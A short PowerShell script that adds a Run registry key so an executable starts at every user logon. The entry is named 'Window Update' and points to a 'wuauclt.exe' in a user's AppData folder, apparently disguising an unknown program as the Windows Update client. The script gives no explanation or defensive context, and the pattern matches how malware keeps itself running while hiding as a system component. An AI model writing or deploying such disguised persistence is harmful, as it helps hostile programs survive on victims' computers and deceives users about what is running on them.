
Function Add-RegistryValue($key,$value)
{
 $scriptRoot = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
 if(-not (Test-Path -path $scriptRoot))
   { 
    New-Item -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" | Out-null 
    New-ItemProperty -Path $scriptRoot -Name $key -Value $value `
    -PropertyType String | Out-Null
    }
  Else
  {
   Set-ItemProperty -Path $scriptRoot -Name $key -Value $value | `
   Out-Null
  }
  
} 

Add-RegistryValue -key "Window Update" -value "C:\Users\Lebron James\AppData\Local\Microsoft\Windows\wuauclt.exe"

